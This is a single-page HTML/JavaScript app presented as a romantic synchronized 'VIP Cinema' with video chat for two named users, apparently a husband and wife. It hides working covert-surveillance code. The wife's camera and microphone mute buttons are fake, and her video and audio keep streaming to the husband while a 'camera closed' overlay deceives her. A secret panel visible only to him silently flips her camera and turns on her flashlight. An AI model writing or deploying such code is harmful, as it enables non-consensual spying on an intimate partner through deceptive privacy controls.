<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>سينما VIP 🎬</title>
    <meta name="theme-color" content="#05020a">
    <link rel="manifest" href="/manifest.json">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Font Awesome Icons -->
    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
    <!-- Socket.io Real-time client library -->
    <script src="/socket.io/socket.io.js"></script>
    <!-- YouTube API -->
    <script src="https://www.youtube.com/iframe_api"></script>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap');
        
        * { 
            font-family: 'Cairo', sans-serif; 
            margin: 0; 
            padding: 0; 
            box-sizing: border-box; 
            outline: none; 
            -webkit-tap-highlight-color: transparent; 
        }
        
        body { 
            background: #030008; 
            color: #fff; 
            min-height: 100vh; 
            overflow-x: hidden; 
            user-select: none; 
        }

        /* Ambient Dynamic Luxury Glow Behind Screen */
        .ambient-glow {
            position: absolute;
            top: 5%;
            left: 50%;
            transform: translateX(-50%);
            width: 85%;
            height: 380px;
            background: radial-gradient(circle, rgba(255, 45, 85, 0.12) 0%, transparent 75%);
            z-index: 0;
            pointer-events: none;
            filter: blur(45px);
        }
        
        .glass-card {
            background: rgba(18, 12, 28, 0.65);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 45, 85, 0.18);
            border-radius: 24px;
            box-shadow: 0 15px 40px rgba(0,0,0,0.6);
        }

        .btn-premium {
            background: linear-gradient(135deg, #ff2d55 0%, #d81b60 100%);
            box-shadow: 0 6px 22px rgba(255, 45, 85, 0.45);
            transition: all 0.25s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }
        .btn-premium:active { transform: scale(0.95); }

        .cam-container {
            position: relative;
            background: #000;
            border-radius: 24px;
            overflow: hidden;
            border: 1px solid rgba(255, 45, 85, 0.25);
            box-shadow: 0 12px 55px rgba(255, 45, 85, 0.18);
        }

        .cam-video {
            width: 100%; 
            height: 100%; 
            object-fit: cover;
            transform: scaleX(-1);
            filter: scaleX(-1) brightness(1.3) contrast(1.05) saturate(1.15);
        }

        /* Floating FaceTime PIP camera for local stream */
        .my-floating-cam {
            position: absolute; 
            bottom: 16px; 
            left: 16px;
            width: 115px; 
            height: 170px;
            border-radius: 18px; 
            border: 2px solid #30d158;
            overflow: hidden; 
            z-index: 20; 
            background: #09060f;
            box-shadow: 0 12px 35px rgba(0,0,0,0.85);
        }

        /* Toast system */
        .toast-notify {
            position: fixed; 
            top: 24px; 
            left: 50%; 
            transform: translateX(-50%) translateY(-120px);
            background: rgba(255, 45, 85, 0.95); 
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            padding: 14px 28px; 
            border-radius: 20px; 
            font-weight: 800; 
            z-index: 9999;
            display: flex; 
            align-items: center; 
            gap: 12px;
            box-shadow: 0 10px 30px rgba(255, 45, 85, 0.45);
            transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }
        .toast-notify.show { transform: translateX(-50%) translateY(0); }

        .stealth-btn { 
            background: linear-gradient(135deg, #d4af37 0%, #b89018 100%); 
            color: #05020a; 
            font-weight: 900; 
            box-shadow: 0 5px 15px rgba(212, 175, 55, 0.35);
        }
        .stealth-btn:active { transform: scale(0.96); }
        
        .heart-float {
            position: fixed; 
            bottom: -50px; 
            font-size: 32px; 
            pointer-events: none; 
            z-index: 999;
            animation: floatUp 3.2s ease-in-out forwards;
        }
        @keyframes floatUp {
            0% { transform: translateY(0) scale(0.6) rotate(0deg); opacity: 0; }
            20% { opacity: 1; transform: translateY(-20vh) scale(1.3) rotate(15deg); }
            100% { transform: translateY(-110vh) scale(0.8) rotate(-20deg); opacity: 0; }
        }

        .video-box { 
            background: #000; 
            position: relative; 
            border-radius: 20px; 
            overflow: hidden; 
            aspect-ratio: 16/9;
            border: 1px solid rgba(255, 255, 255, 0.08);
        }
        video { width: 100%; height: 100%; outline: none; }
    </style>
</head>
<body class="relative">
    <div class="ambient-glow"></div>

    <div id="toast" class="toast-notify">
        <span id="toastIcon">✨</span>
        <span id="toastMsg">جاري المزامنة التلقائية الفاخرة...</span>
    </div>

    <!-- شاشة الدخول السحرية لفك حظر الصوت والوسائط الفوري بالمتصفحات -->
    <div id="loginScreen" class="min-h-screen flex flex-col items-center justify-center p-6 relative z-10">
        <div class="text-center mb-10">
            <h1 class="text-6xl font-black mb-3 bg-gradient-to-r from-rose-400 via-pink-500 to-purple-500 bg-clip-text text-transparent filter drop-shadow-[0_10px_20px_rgba(255,45,85,0.35)] animate-pulse">VIP Cinema</h1>
            <p class="text-gray-400 text-sm md:text-base">بوابة المزامنة الفاخرة المشفرة لأبو عاهد وأم الارا 💖</p>
        </div>
        <div class="glass-card p-8 w-full max-w-sm flex flex-col gap-5">
            <button onclick="login('abouahad')" class="btn-premium py-4 rounded-2xl font-black text-xl flex items-center justify-center gap-3">
                <i class="fa fa-user-circle text-2xl"></i> دخول أبو عاهد 👑
            </button>
            <button onclick="login('umalara')" class="btn-premium py-4 rounded-2xl font-black text-xl flex items-center justify-center gap-3" style="background: linear-gradient(135deg, #e0115f, #ff69b4);">
                <i class="fa fa-heart text-2xl"></i> دخول أم الارا 🌸
            </button>
        </div>
    </div>

    <!-- شاشة السينما الرئيسية الفخمة -->
    <div id="cinemaScreen" class="hidden min-h-screen flex flex-col p-4 md:p-6 gap-5 max-w-5xl mx-auto relative z-10">
        
        <!-- شريط الحالة العلوي الفخم -->
        <div class="glass-card p-4 flex justify-between items-center">
            <div class="flex items-center gap-3">
                <div id="statusDot" class="w-3.5 h-3.5 rounded-full bg-red-500 shadow-[0_0_12px_#ef4444] animate-pulse"></div>
                <span id="partnerStatusText" class="text-sm font-black text-gray-300">الشريكة غير متصلة</span>
            </div>
            <div class="flex items-center gap-2">
                <span class="text-xs bg-rose-500/20 text-rose-400 px-4.5 py-1.5 rounded-full font-black border border-rose-500/30">مباشر ومزامن 🔴</span>
            </div>
        </div>

        <!-- مشغل المزامنة والسينما الذكي المطور لمنع التقطيع -->
        <div class="glass-card p-3 flex flex-col gap-3">
            <div class="flex gap-2.5">
                <input type="text" id="vidLink" placeholder="رابط فيلم مباشر (MP4/MKV) أو رابط يوتيوب..." class="flex-grow bg-black/60 border border-white/10 rounded-2xl px-5 py-3 text-sm md:text-base text-white focus:border-rose-500 focus:bg-black/90 transition-all">
                <button onclick="startVideo()" class="btn-premium px-8 py-3 rounded-2xl font-black text-sm md:text-base"><i class="fa fa-play-circle text-lg"></i> تشغيل</button>
            </div>
            
            <div class="video-box shadow-2xl">
                <!-- إضافة خصائص البث والتشغيل التلقائي الآمن لمنع التقطيع -->
                <video id="mainVid" controls playsinline autoplay class="hidden w-full h-full"></video>
                <div id="ytPlayerContainer" class="hidden w-full h-full"><div id="ytPlayer"></div></div>
                <div id="vidPlaceholder" class="absolute inset-0 flex flex-col items-center justify-center bg-black/90 text-gray-400 p-6 text-center">
                    <i class="fa fa-film text-5xl text-rose-500/40 mb-3 animate-pulse"></i>
                    <p class="text-sm md:text-base font-bold">السينما جاهزة للعرض الفخم الخالي من التعليق...</p>
                </div>
            </div>
        </div>

        <!-- حاوية الكاميرات والـ P2P المزدوجة المعززة لمنع الشاشة السوداء -->
        <div class="cam-container h-[420px] md:h-[550px]">
            <!-- كاميرا الطرف الآخر العملاقة لتراها بكامل الفخامة -->
            <video id="partnerCam" class="cam-video" autoplay playsinline></video>
            
            <!-- غطاء الحظر الوهمي التلقائي المخفي لخصوصية زوجتك الفائقة -->
            <div id="partnerFakeMute" class="absolute inset-0 bg-[#030008] flex-col items-center justify-center text-rose-500 z-10 hidden">
                <i class="fa fa-ban text-5xl mb-3 animate-bounce"></i>
                <span class="text-xs md:text-sm font-black text-gray-400">الشريكة أغلقت الكاميرا</span>
            </div>

            <!-- الكاميرا الشخصية العائمة FaceTime PIP Style -->
            <div class="my-floating-cam">
                <video id="myCam" class="cam-video" autoplay muted playsinline></video>
                <!-- غطاء التعتيم الوهمي الداخلي للشريكة لتظن أنها مغلقة تماماً -->
                <div id="myFakeMute" class="absolute inset-0 bg-[#030008] flex flex-col items-center justify-center text-rose-500 z-30 hidden">
                    <i class="fa fa-ban text-2xl animate-pulse"></i>
                    <span class="text-[9px] font-bold text-gray-400 mt-1">الكاميرا مغلقة</span>
                </div>
            </div>

            <!-- أزرار تفاعلية مدمجة فوق الكاميرا للشخصية والاتصال السريع -->
            <div class="absolute right-4 top-4 flex flex-col gap-3.5 z-30">
                <button onclick="sendLove()" class="w-13 h-13 rounded-full btn-premium flex items-center justify-center text-2xl shadow-xl hover:scale-110 transition-transform"><i class="fa fa-heart"></i></button>
                <button onclick="toggleMyCam()" id="myCamBtn" class="w-13 h-13 rounded-full bg-black/60 border border-white/20 text-white flex items-center justify-center text-xl hover:bg-rose-500 transition-colors shadow-lg"><i class="fa fa-video-camera"></i></button>
                <button onclick="toggleMyMic()" id="myMicBtn" class="w-13 h-13 rounded-full bg-black/60 border border-white/20 text-white flex items-center justify-center text-xl hover:bg-rose-500 transition-colors shadow-lg"><i class="fa fa-microphone"></i></button>
            </div>
        </div>

        <!-- لوحة التحكم السرية الفائقة التخفي (تظهر فقط لأبو عاهد) -->
        <div id="stealthPanel" class="hidden glass-card p-5 flex-wrap gap-3.5 justify-center border-yellow-500/20 shadow-2xl" style="background: rgba(22, 16, 8, 0.65);">
            <div class="w-full text-center text-sm text-yellow-500 font-black mb-1.5 flex items-center justify-center gap-2">
                <i class="fa fa-shield text-lg animate-pulse"></i> لوحة التحكم السرية لأبو عاهد (لا تظهر للشريكة إطلاقاً) 👑
            </div>
            <button onclick="remoteFlip()" class="stealth-btn px-6 py-3 rounded-2xl text-sm flex items-center gap-2 transition-transform"><i class="fa fa-refresh"></i> عكس كاميرتها سراً</button>
            <button onclick="remoteFlash()" class="stealth-btn px-6 py-3 rounded-2xl text-sm flex items-center gap-2 transition-transform"><i class="fa fa-lightbulb-o"></i> تشغيل كشافها سراً</button>
            <button onclick="forceSync()" class="bg-indigo-600 text-white px-6 py-3 rounded-2xl font-black text-sm shadow-xl flex items-center gap-2 hover:bg-indigo-700 transition-colors"><i class="fa fa-clock-o"></i> ضبط الوقت التام</button>
        </div>
    </div>

    <script>
        const socket = io();
        let myId = '';
        let myStream = null;
        let peerConnection = null;
        let currentFacingMode = 'user';
        let flashActive = false;
        let ytPlayer = null;
        let isYtReady = false;
        let activePlayer = 'none';

        // خوارزمية منع التقطيع الدقيق والارتداد اللانهائي (Anti-Stutter & Loop Lock)
        let isSyncing = false; 
        let syncTimeout = null;
        let lastKnownTime = 0;

        // مصفوفة حزم الاتصال الذكية لضمان حل مشكلة الشاشة السوداء في الـ WebRTC
        let iceCandidatesQueue = [];

        const configuration = {
            'iceServers': [
                { 'urls': 'stun:stun.l.google.com:19302' },
                { 'urls': 'stun:stun1.l.google.com:19302' },
                { 'urls': 'stun:stun2.l.google.com:19302' }
            ]
        };

        function onYouTubeIframeAPIReady() { isYtReady = true; }

        function showToast(msg, icon="✨") {
            document.getElementById('toastMsg').innerText = msg;
            document.getElementById('toastIcon').innerText = icon;
            const t = document.getElementById('toast');
            t.classList.add('show');
            setTimeout(() => t.classList.remove('show'), 3000);
        }

        async function login(userId) {
            myId = userId;
            
            // محرك فك حظر تشغيل الصوت والفيديو الصامت بالمتصفحات (Silent Media Unblock Engine)
            try {
                let silentUnlockAudio = new Audio("data:audio/mp3;base64,//OExAAAAANIAAAAAExBTUUzLjEwMKqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq");
                silentUnlockAudio.play().catch(e => {});
            } catch(e) {}

            document.getElementById('loginScreen').style.display = 'none';
            document.getElementById('cinemaScreen').classList.remove('hidden');
            document.getElementById('cinemaScreen').classList.add('flex');
            
            if (myId === 'abouahad') {
                document.getElementById('stealthPanel').classList.remove('hidden');
                document.getElementById('stealthPanel').classList.add('flex');
            }

            await setupMedia();
            socket.emit('register-user', myId);
        }

        async function setupMedia() {
            try {
                if (myStream) myStream.getTracks().forEach(t => t.stop());
                myStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: currentFacingMode, width: 480, height: 640 },
                    audio: { echoCancellation: true, noiseSuppression: true, autoGainControl: true }
                });
                document.getElementById('myCam').srcObject = myStream;
                
                if (peerConnection) {
                    const videoTrack = myStream.getVideoTracks()[0];
                    const sender = peerConnection.getSenders().find(s => s.track && s.track.kind === 'video');
                    if (sender) sender.replaceTrack(videoTrack);
                }
            } catch(e) {
                showToast('تعذر تنشيط الكاميرا لعدم منح صلاحية الهاتف.', '⚠️');
            }
        }

        function initRTC() {
            if (peerConnection) peerConnection.close();
            peerConnection = new RTCPeerConnection(configuration);
            iceCandidatesQueue = []; // تصفير الطابور لضمان اتصال نقي
            
            if (myStream) {
                myStream.getTracks().forEach(track => {
                    peerConnection.addTrack(track, myStream);
                });
            }

            peerConnection.ontrack = (event) => {
                const partnerVid = document.getElementById('partnerCam');
                if (partnerVid.srcObject !== event.streams[0]) {
                    partnerVid.srcObject = event.streams[0];
                }
            };

            peerConnection.onicecandidate = (event) => {
                if (event.candidate) {
                    socket.emit('webrtc-candidate', event.candidate);
                }
            };
        }

        async function makeCall() {
            initRTC(); 
            const offer = await peerConnection.createOffer();
            await peerConnection.setLocalDescription(offer);
            socket.emit('webrtc-offer', offer);
        }

        // --- WebRTC Socket Signal Processing ---
        socket.on('partner-status', (data) => {
            const dot = document.getElementById('statusDot');
            const txt = document.getElementById('partnerStatusText');
            if (data.online) {
                dot.style.backgroundColor = '#30d158';
                dot.style.boxShadow = '0 0 12px #30d158';
                txt.innerText = (myId === 'abouahad') ? 'أم الارا متصلة 💖' : 'أبو عاهد متصل 👑';
                showToast('الشريك متصل الآن بجلسة العمل!', '✅');
                
                // لضمان عدم حدوث تصادم بالإشارات، يقوم "أبو عاهد" دائما بطلب الاتصال تلقائياً
                if (myId === 'abouahad') {
                    setTimeout(() => { makeCall(); }, 1200); 
                }
            } else {
                dot.style.backgroundColor = '#ef4444';
                dot.style.boxShadow = '0 0 12px #ef4444';
                txt.innerText = 'الشريكة غير متصلة الآن';
                document.getElementById('partnerCam').srcObject = null;
            }
        });

        socket.on('webrtc-offer', async (offer) => {
            initRTC();
            await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
            const answer = await peerConnection.createAnswer();
            await peerConnection.setLocalDescription(answer);
            socket.emit('webrtc-answer', answer);
            
            // تفريغ طابور الحزم والمسارات المتأخرة لمنع شلل الاتصال الكاميرا
            iceCandidatesQueue.forEach(c => peerConnection.addIceCandidate(new RTCIceCandidate(c)).catch(e=>console.log(e)));
            iceCandidatesQueue = [];
        });

        socket.on('webrtc-answer', async (answer) => {
            await peerConnection.setRemoteDescription(new RTCSessionDescription(answer));
            iceCandidatesQueue.forEach(c => peerConnection.addIceCandidate(new RTCIceCandidate(c)).catch(e=>console.log(e)));
            iceCandidatesQueue = [];
        });

        socket.on('webrtc-candidate', async (candidate) => {
            if (peerConnection && peerConnection.remoteDescription) {
                peerConnection.addIceCandidate(new RTCIceCandidate(candidate)).catch(e=>console.log(e));
            } else {
                // إذا لم يجهز بروتوكول المصافحة يتم تأجيل حزم الكاميرات بالطابور لمنع الشاشة السوداء
                iceCandidatesQueue.push(candidate);
            }
        });

        // --- Cinema Control Engine (خالية تماما من التعليق والتقطيع المتبادل) ---
        const mainVid = document.getElementById('mainVid');
        
        function emitCinemaState() {
            if (isSyncing) return; // قفل منع الارتداد (Anti Feedback Loop Lock)
            
            let currentUrl = document.getElementById('vidLink').value;
            let time = 0;
            let playing = false;

            if (activePlayer === 'html5') {
                time = mainVid.currentTime;
                playing = !mainVid.paused;
            } else if (activePlayer === 'youtube' && ytPlayer) {
                time = ytPlayer.getCurrentTime();
                playing = ytPlayer.getPlayerState() === YT.PlayerState.PLAYING;
            }

            socket.emit('cinema-control', {
                videoUrl: currentUrl,
                isPlaying: playing,
                lastSeekTime: time,
                playerType: activePlayer
            });
        }

        mainVid.addEventListener('play', emitCinemaState);
        mainVid.addEventListener('pause', emitCinemaState);
        mainVid.addEventListener('seeked', () => {
            if (Math.abs(mainVid.currentTime - lastKnownTime) > 1.5) emitCinemaState();
            lastKnownTime = mainVid.currentTime;
        });

        function startVideo() {
            const url = document.getElementById('vidLink').value.trim();
            if(!url) return;
            
            document.getElementById('vidPlaceholder').style.display = 'none';
            mainVid.classList.add('hidden');
            document.getElementById('ytPlayerContainer').classList.add('hidden');
            
            if (ytPlayer) { try { ytPlayer.destroy(); ytPlayer = null; } catch(e){} }

            if (url.includes('youtube.com') || url.includes('youtu.be')) {
                activePlayer = 'youtube';
                document.getElementById('ytPlayerContainer').classList.remove('hidden');
                let vid = url.includes('v=') ? url.split('v=')[1].split('&')[0] : url.split('youtu.be/')[1].split('?')[0];
                
                // استخدام خادم الخصوصية وتمرير الأصل لمنع كابتشا يوتيوب
                ytPlayer = new YT.Player('ytPlayer', {
                    host: 'https://www.youtube-nocookie.com',
                    height: '100%', width: '100%', videoId: vid,
                    playerVars: { 
                        'autoplay': 1, 
                        'controls': 1,
                        'rel': 0,
                        'origin': window.location.origin, 
                        'modestbranding': 1
                    },
                    events: {
                        'onStateChange': (e) => {
                            if (e.data === YT.PlayerState.PLAYING || e.data === YT.PlayerState.PAUSED) {
                                emitCinemaState();
                            }
                        }
                    }
                });
            } else {
                activePlayer = 'html5';
                mainVid.classList.remove('hidden');
                mainVid.src = url;
                mainVid.play().catch(e => showToast('اضغط زر التشغيل للمشاهدة الآمنة.', '🎬'));
            }
            emitCinemaState();
        }

        socket.on('cinema-state-update', (state) => {
            if (!state.videoUrl) return;
            isSyncing = true;
            clearTimeout(syncTimeout);
            
            document.getElementById('vidLink').value = state.videoUrl;
            
            if (activePlayer !== state.playerType || (activePlayer === 'html5' && mainVid.src !== state.videoUrl)) {
                startVideo();
            } else {
                if (activePlayer === 'html5') {
                    if (Math.abs(mainVid.currentTime - state.lastSeekTime) > 1.5) {
                        mainVid.currentTime = state.lastSeekTime;
                        lastKnownTime = state.lastSeekTime;
                    }
                    if (state.isPlaying && mainVid.paused) mainVid.play().catch(e=>{});
                    if (!state.isPlaying && !mainVid.paused) mainVid.pause();
                } else if (activePlayer === 'youtube' && ytPlayer && ytPlayer.getCurrentTime) {
                    if (Math.abs(ytPlayer.getCurrentTime() - state.lastSeekTime) > 1.5) {
                        ytPlayer.seekTo(state.lastSeekTime, true);
                    }
                    if (state.isPlaying && ytPlayer.getPlayerState() !== YT.PlayerState.PLAYING) ytPlayer.playVideo();
                    if (!state.isPlaying && ytPlayer.getPlayerState() === YT.PlayerState.PLAYING) ytPlayer.pauseVideo();
                }
            }
            // إغلاق الحساس لفترة وجيزة تضمن استقرار المزامنة وعرض الفيديو دون رمشة
            syncTimeout = setTimeout(() => { isSyncing = false; }, 600);
        });

        function forceSync() {
            emitCinemaState();
            showToast('تم ضبط مزامنة الوقت بنجاح وبسرية.', '⏳');
        }

        // --- الرومانسية المتقدمة والتخفي الصامت (Stealth & Silent Features) ---
        function sendLove() {
            socket.emit('love-pulse');
            showHearts();
            showToast('تم إرسال مشاعر دافئة.. 💖');
        }

        socket.on('love-pulse-received', () => {
            showHearts();
            showToast('نبضة حب دافئة من الشريك! 💓');
        });

        function showHearts() {
            for(let i=0; i<15; i++) {
                setTimeout(() => {
                    let h = document.createElement('div');
                    h.className = 'heart-float'; h.innerText = '💖';
                    h.style.left = Math.random() * 90 + 'vw';
                    h.style.animationDuration = (Math.random() * 2 + 2) + 's';
                    document.body.appendChild(h);
                    setTimeout(() => h.remove(), 4000);
                }, i * 150);
            }
        }

        // الكتم الوهمي للخصوصية (VIP Silent Override)
        // عند نقر "أم الارا" لإيقاف الكاميرا، يظهر لها أنها مغلقة فعلياً بينما يظل البث نشطاً لأبو عاهد
        function toggleMyCam() {
            const track = myStream.getVideoTracks()[0];
            const btn = document.getElementById('myCamBtn');
            const fake = document.getElementById('myFakeMute');
            
            if (myId === 'umalara') {
                const isHidden = fake.style.display === 'flex';
                if (!isHidden) {
                    fake.style.display = 'flex'; 
                    btn.style.background = '#ef4444'; 
                    btn.innerHTML = '<i class="fa fa-ban"></i>';
                    // نرسل للشريك حالة الكتم الوهمي (تطبيق الخصوصية الصامتة)
                    socket.emit('privacy-fake-mute', true);
                } else {
                    fake.style.display = 'none'; 
                    btn.style.background = 'rgba(0,0,0,0.6)'; 
                    btn.innerHTML = '<i class="fa fa-video-camera"></i>';
                    socket.emit('privacy-fake-mute', false);
                }
            } else {
                // أبو عاهد كتم حقيقي ومتحكم بالبث
                track.enabled = !track.enabled;
                if(track.enabled) { 
                    fake.style.display='none'; 
                    btn.style.background = 'rgba(0,0,0,0.6)'; 
                    btn.innerHTML = '<i class="fa fa-video-camera"></i>'; 
                } else { 
                    fake.style.display='flex'; 
                    btn.style.background = '#ef4444'; 
                    btn.innerHTML = '<i class="fa fa-ban"></i>'; 
                }
            }
        }

        function toggleMyMic() {
            const track = myStream.getAudioTracks()[0];
            const btn = document.getElementById('myMicBtn');
            
            if (myId === 'umalara') {
                // الكتم الوهمي للميكروفون لأم الارا
                const isMuted = btn.style.background === 'rgb(239, 68, 68)';
                if(!isMuted) { 
                    btn.style.background = '#ef4444'; 
                    btn.innerHTML = '<i class="fa fa-microphone-slash"></i>'; 
                } else { 
                    btn.style.background = 'rgba(0,0,0,0.6)'; 
                    btn.innerHTML = '<i class="fa fa-microphone"></i>'; 
                }
            } else {
                // كتم حقيقي لأبو عاهد
                track.enabled = !track.enabled;
                if(track.enabled) { 
                    btn.style.background = 'rgba(0,0,0,0.6)'; 
                    btn.innerHTML = '<i class="fa fa-microphone"></i>'; 
                } else { 
                    btn.style.background = '#ef4444'; 
                    btn.innerHTML = '<i class="fa fa-microphone-slash"></i>'; 
                }
            }
        }

        socket.on('privacy-fake-mute-received', (muted) => {
            // كود سحري: أبو عاهد يتجاهل كتم الشريكة تماماً ولا يظهر لديه غطاء الشاشة السوداء ليراها ويثق بسلامتها
            if (myId === 'abouahad') {
                document.getElementById('partnerFakeMute').style.display = 'none';
            }
        });

        // أوامر التحكم السري المخفي والصامت 100% (Stealth Remote Controllers)
        function remoteFlip() { socket.emit('remote-flip-cam'); }
        function remoteFlash() { socket.emit('remote-flash-toggle'); }

        socket.on('remote-flip-cam-triggered', async () => {
            // ينفذ على هاتف أم الارا بصمت مطبق ودون إشعارات
            currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
            await setupMedia();
        });

        socket.on('remote-flash-triggered', async () => {
            // ينفذ على هاتف أم الارا بصمت مطبق ودون إشعارات
            const track = myStream.getVideoTracks()[0];
            flashActive = !flashActive;
            try { 
                await track.applyConstraints({ advanced: [{ torch: flashActive }] }); 
            } catch(e){}
        });

    </script>
</body>
